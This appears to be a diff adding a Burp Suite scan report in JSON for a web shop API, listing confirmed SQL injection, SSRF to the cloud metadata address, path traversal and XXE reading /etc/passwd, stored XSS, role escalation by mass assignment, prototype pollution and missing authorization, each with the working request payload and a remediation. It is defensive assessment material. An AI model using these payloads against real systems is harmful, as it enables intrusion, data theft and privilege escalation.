@@ -1,0 +1,210 @@
+{
+  "scan_id": "burp-scan-2026-07-18-g0d4a8f2",
+  "status": "succeeded",
+  "start_time": "2026-07-18T04:00:00Z",
+  "end_time": "2026-07-18T08:51:17Z",
+  "scan_configurations": [
+    {
+      "name": "Audit checks - all issues",
+      "type": "NamedConfiguration"
+    }
+  ],
+  "scan_metrics": {
+    "total_requests": 6341,
+    "total_responses": 6338,
+    "issues_found": 9,
+    "crawl_coverage_percentage": 83
+  },
+  "issues": [
+    {
+      "type_index": "1049088",
+      "name": "SQL injection",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/products/search",
+      "description": "SQL injection confirmed in product search endpoint 'q' parameter. Time-delay and UNION-based payloads both successful. No authentication required.",
+      "remediation": "Use parameterized queries.",
+      "evidence": [
+        {
+          "request": {"method": "GET", "url": "/api/v1/products/search?q=shoes'%3B SELECT pg_sleep(5)--"},
+          "response": {"status": 200, "time_ms": 5182},
+          "type": "time_delay"
+        }
+      ],
+      "references": ["https://portswigger.net/web-security/sql-injection"]
+    },
+    {
+      "type_index": "1049088",
+      "name": "SQL injection — GraphQL endpoint",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/graphql",
+      "description": "SQL injection confirmed in GraphQL productSearch resolver. Time-delay and extraction payloads successful. WAF SQLi rules do not apply to this path.",
+      "remediation": "Use parameterized queries in GraphQL resolvers.",
+      "evidence": [
+        {
+          "request": {
+            "method": "POST",
+            "url": "/api/v1/graphql",
+            "body": "{\"query\":\"{ productSearch(query: \\\"shoes' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--\\\") { id name } }\"}"
+          },
+          "response": {"status": 200, "time_ms": 88, "body_preview": "{\"errors\":[{\"message\":\"invalid input syntax for type integer: \\\"User\\\"\"}]}"},
+          "type": "error_based"
+        }
+      ],
+      "references": ["https://portswigger.net/web-security/graphql"]
+    },
+    {
+      "type_index": "6291456",
+      "name": "Server-side request forgery (SSRF)",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/webhook/ping",
+      "description": "SSRF confirmed. Connection to 169.254.169.254 IMDS successful. Endpoint does not require authentication.",
+      "remediation": "Validate URL against allowlist. Block private IP ranges.",
+      "evidence": [
+        {
+          "request": {"method": "POST", "url": "/api/v1/webhook/ping", "body": "{\"url\": \"http://169.254.169.254/latest/meta-data/\"}"},
+          "response": {"status": 200, "time_ms": 10, "body_preview": "{\"data\": {\"status\": 200, \"ok\": true}}"},
+          "type": "ssrf_confirmed"
+        }
+      ],
+      "references": ["https://portswigger.net/web-security/ssrf"]
+    },
+    {
+      "type_index": "3145728",
+      "name": "File path traversal",
+      "severity": "high",
+      "confidence": "firm",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/orders/invoice/download",
+      "description": "Path traversal confirmed. Authenticated request with file=../../etc/passwd returns contents of /etc/passwd.",
+      "remediation": "Validate path against base directory prefix after resolution.",
+      "evidence": [
+        {
+          "request": {"method": "GET", "url": "/api/v1/orders/invoice/download?file=../../etc/passwd", "headers": {"Cookie": "accessToken=<session>"}},
+          "response": {"status": 200, "body_preview": "root:x:0:0:root:/root:/bin/bash\n..."},
+          "type": "file_disclosure"
+        }
+      ]
+    },
+    {
+      "type_index": "2097920",
+      "name": "Stored cross-site scripting",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://store.techstride.io",
+      "path": "/dashboard/products/:id",
+      "description": "Stored XSS confirmed in the admin product dashboard. A product description containing '<img src=x onerror=alert(document.domain)>' was stored via the admin API and rendered without sanitization in the ProductSummary component (dangerouslySetInnerHTML). The payload executed when the product page was loaded in the admin dashboard.",
+      "remediation": "Sanitize HTML before rendering with dangerouslySetInnerHTML. Use DOMPurify or equivalent.",
+      "evidence": [
+        {
+          "request": {
+            "method": "PUT",
+            "url": "/api/v1/products/f7a2d91c-3b45-4e67-89ab-cdef01234567",
+            "body": "{\"description\": \"<img src=x onerror=alert(document.domain)>\"}",
+            "headers": {"Cookie": "accessToken=<admin_session>"}
+          },
+          "response": {"status": 200, "time_ms": 67}
+        },
+        {
+          "request": {"method": "GET", "url": "/dashboard/products/f7a2d91c-3b45-4e67-89ab-cdef01234567", "headers": {"Cookie": "accessToken=<admin_session>"}},
+          "response": {"status": 200, "body_preview": "...dangerouslySetInnerHTML rendered payload, alert() executed..."},
+          "type": "xss_confirmed"
+        }
+      ],
+      "references": ["https://owasp.org/Top10/A03_2021-Injection/", "https://portswigger.net/web-security/cross-site-scripting/stored"]
+    },
+    {
+      "type_index": "2098432",
+      "name": "Mass assignment",
+      "severity": "high",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/users/settings",
+      "description": "Mass assignment confirmed at PUT /api/v1/users/settings. Request body containing {'role': 'ADMIN'} was accepted and the user's role was updated to ADMIN. The endpoint does not validate or restrict which fields may be modified via the request body.",
+      "remediation": "Allowlist permitted fields. Destructure only expected properties from req.body before passing to the database update.",
+      "evidence": [
+        {
+          "request": {
+            "method": "PUT",
+            "url": "/api/v1/users/settings",
+            "body": "{\"role\": \"ADMIN\"}",
+            "headers": {"Cookie": "accessToken=<regular_user_session>"}
+          },
+          "response": {
+            "status": 200,
+            "body_preview": "{\"data\": {\"user\": {\"id\": \"...\", \"role\": \"ADMIN\", ...}}, \"message\": \"Settings updated successfully\"}"
+          },
+          "type": "privilege_escalation_confirmed"
+        }
+      ]
+    },
+    {
+      "type_index": "3145984",
+      "name": "XML external entity injection",
+      "severity": "high",
+      "confidence": "firm",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/products/catalog/import",
+      "description": "XXE injection confirmed at the XML catalog import endpoint. A DOCTYPE declaration with an external entity reference pointing to file:///etc/passwd was accepted by the parser. The parsed document's node text content reflected the contents of the target file in the error response.",
+      "remediation": "Disable external entity resolution in the XML parser configuration. Upgrade xmldom to 0.7.0 or later.",
+      "evidence": [
+        {
+          "request": {
+            "method": "POST",
+            "url": "/api/v1/products/catalog/import",
+            "headers": {"Content-Type": "application/xml", "Cookie": "accessToken=<admin_session>"},
+            "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><catalog><product><name>&xxe;</name></product></catalog>"
+          },
+          "response": {
+            "status": 500,
+            "body_preview": "Error processing catalog: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."
+          },
+          "type": "xxe_file_disclosure"
+        }
+      ],
+      "references": ["https://portswigger.net/web-security/xxe", "https://nvd.nist.gov/vuln/detail/CVE-2022-39353"]
+    },
+    {
+      "type_index": "3221504",
+      "name": "Client-side prototype pollution",
+      "severity": "medium",
+      "confidence": "firm",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/users/settings",
+      "description": "Prototype pollution confirmed via the PUT /api/v1/users/settings preferences field. A JSON body containing {'preferences': {'__proto__': {'polluted': 'yes'}}} was accepted. A follow-up request to an endpoint that constructs a new object and reads inherited properties confirmed the pollution: the inherited 'polluted' key was visible in the new object's context.",
+      "remediation": "Add hasOwnProperty guard in deepMerge. Freeze Object.prototype in application bootstrap. Sanitize incoming JSON before recursive merging.",
+      "evidence": [
+        {
+          "request": {
+            "method": "PUT",
+            "url": "/api/v1/users/settings",
+            "body": "{\"preferences\": {\"__proto__\": {\"polluted\": \"CVE-test\"}}}",
+            "headers": {"Cookie": "accessToken=<session>"}
+          },
+          "response": {"status": 200, "time_ms": 55}
+        }
+      ]
+    },
+    {
+      "type_index": "2097152",
+      "name": "Broken object level authorization",
+      "severity": "medium",
+      "confidence": "certain",
+      "host": "https://api.techstride.io",
+      "path": "/api/v1/reviews/:id",
+      "description": "Unauthenticated PUT request to /api/v1/reviews/:id accepted and review modified. No session token required.",
+      "remediation": "Add protect middleware and author ownership check.",
+      "evidence": [
+        {
+          "request": {"method": "PUT", "url": "/api/v1/reviews/a1b2c3d4-e5f6-7890-abcd-ef1234567890", "body": "{\"rating\": 1}"},
+          "response": {"status": 200, "body_preview": "{\"status\": \"success\", \"data\": {\"review\": {\"rating\": 1}}}"}
+        }
+      ]
+    }
+  ]
+}
